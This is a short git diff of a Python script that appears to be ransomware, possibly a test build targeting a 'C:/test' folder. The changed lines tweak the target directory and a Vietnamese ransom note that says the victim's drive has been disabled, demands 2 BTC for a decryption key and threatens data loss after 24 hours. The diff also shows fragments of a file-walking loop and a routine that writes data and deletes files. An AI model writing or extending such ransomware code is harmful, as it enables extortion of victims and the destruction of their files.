@@ -26,7 +26,7 @@ def decrypt_file(file_path):
         fp.write(_data)
     os.remove(file_path)
 
-directory = "C:/Test"
+directory = "C:/test"
 
 list_file = os.walk(directory)
 for root, _, files in list_file:
@@ -58,7 +58,7 @@ root.geometry("800x400")
 
 message = """Ổ đĩa {} của bạn đã bị vô hiệu hóa.
 Vui lòng thanh toán 2 BTC để nhận được key giải mã.
-Thông tin liên hệ ở D:/info.txt.
+Thông tin liên hệ ở C:/info.txt.
 Liên hệ sau 24h tiếp theo kể từ {} để tránh mất dữ liệu.""".format(directory, datetime.now().strftime('%H:%M:%S'))
 label = tk.Label(root, text=message, font=("Arial", 14))
 label.pack(pady=10)
